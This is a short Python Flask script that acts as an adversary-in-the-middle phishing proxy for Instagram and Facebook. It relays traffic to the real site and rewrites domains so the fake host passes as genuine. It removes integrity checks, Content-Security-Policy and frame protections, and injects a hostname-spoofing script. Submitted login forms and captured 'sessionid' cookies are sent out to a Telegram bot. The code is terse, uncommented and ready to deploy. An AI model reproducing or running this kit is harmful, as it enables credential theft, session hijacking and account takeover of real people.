import os, re, json, urllib3, requests
from flask import Flask, request, make_response
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = Flask(__name__)
a.secret_key = os.urandom(32).hex()

T = os.environ.get("T_BOT", ""); C = os.environ.get("T_CHAT", "")

class E:
    def __init__(self):
        self.d = "www.instagram.com"
        self.p = ["www.instagram.com", "instagram.com", "static.cdninstagram.com", "scontent.cdninstagram.com", "www.facebook.com", "facebook.com"]

    def n(self, m):
        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
        except: pass

    def r(self, t, h):
        for d in self.p:
            t = t.replace(f"https://{d}", f"https://{h}")
            t = t.replace(f"//{d}", f"//{h}")
            t = t.replace(d, h)
        t = re.sub(r'integrity="[^"]+"', '', t)
        t = t.replace('Content-Security-Policy', 'X-Ignored-CSP')
        if '<head>' in t:
            i = f"<script>Object.defineProperty(window.location, 'hostname', {{get: () => '{h}'}});</script>"
            t = t.replace('<head>', f"<head>{i}")
        return t

e = E()

@a.route('/', defaults={'x': ''})
@a.route('/<path:x>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def f(x):
    h = request.headers.get('Host', '').split(':')[0]
    u = urljoin(f"https://{e.d}", x)
    if request.query_string: u += '?' + request.query_string.decode()

    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
    H['Host'] = e.d

    if request.method == 'POST':
        D = request.form.to_dict() or request.get_json(silent=True) or {}
        if D: e.n(f"🔐 <b>L:</b>\n<pre>{json.dumps(D, indent=2)}</pre>")

    try:
        R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
        
        B = R.content
        try: B = e.r(R.content.decode('utf-8', errors='ignore'), h).encode()
        except: pass

        r = make_response(B)
        r.status_code = R.status_code

        for k, v in R.headers.items():
            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'x-frame-options']:
                r.headers[k] = v

        for k, v in R.cookies.items():
            r.set_cookie(k, v, domain=h, secure=True, httponly=True, samesite='Lax')

        if 'sessionid' in R.cookies:
            e.n(f"🔥 <b>S:</b>\n<code>{json.dumps(R.cookies.get_dict())}</code>")

        if R.status_code in [301, 302, 303, 307, 308]:
            l = R.headers.get('Location', '').replace(e.d, h)
            r.headers['Location'] = l

        return r
    except: return "X", 503

if __name__ == '__main__':
    a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
